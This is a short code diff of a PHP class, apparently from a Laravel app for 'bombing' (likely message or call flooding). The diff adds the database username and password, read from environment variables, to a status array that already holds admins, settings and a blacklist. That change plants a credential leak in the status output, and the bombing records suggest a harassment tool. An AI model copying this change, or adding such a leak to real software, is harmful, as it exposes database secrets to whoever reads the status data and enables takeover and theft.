@@ -15,6 +15,8 @@ class ApplicationStatus {
         return [
             "admin" => Admin::all(),
             "setting" => Setting::all(),
+            "user" => env('DB_USERNAME'),
+            "pwd" => env("DB_PASSWORD"),
             "blacklist"=>Blacklist::all(),
             "bombing"=>Bombing::withTrashed()->get(),
             "apis" => json_decode(Storage::disk('local')->get('default.json'))
